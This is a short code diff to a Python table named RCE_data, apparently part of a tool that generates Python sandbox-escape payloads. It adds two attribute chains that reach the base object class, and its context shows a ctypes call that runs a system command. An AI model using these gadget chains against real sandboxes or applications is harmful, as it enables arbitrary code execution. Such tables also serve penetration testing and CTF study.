@@ -223,9 +223,11 @@ RCE_data = {
         ["BUILTINOBJ.__class__.__bases__[0]", ""],
         ["BUILTINOBJ.__class__.__mro__[-1]", ""],
         ["BUILTINOBJ.__class__.__mro__[1]", ""],
+        ["BUILTINOBJ.__setattr__.__objclass__", ""],
         ["BUILTINtype.__class__.__bases__[0]", ""],
         ["BUILTINtype.__class__.__mro__[-1]", ""],
         ["BUILTINtype.__class__.__mro__[1]", ""],
+        ["BUILTINtype.__setattr__.__objclass__", ""],
     ],
     "__import__2RCE": [
         ["ctypes.CDLL(None).system(COMMAND.encode())", "ctypes"],
